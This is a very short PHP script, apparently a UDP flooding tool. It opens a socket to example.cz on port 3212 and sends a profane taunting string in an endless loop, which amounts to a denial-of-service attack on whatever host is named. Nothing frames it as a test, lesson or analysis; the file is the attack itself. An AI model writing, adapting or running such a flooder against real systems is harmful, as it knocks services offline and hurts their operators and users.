#!/usr/bin/php
<?php

$fp = fsockopen("udp://example.cz", 3212);
while(1) fwrite($fp, "LOOL-FUCK-U-ALLOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO");
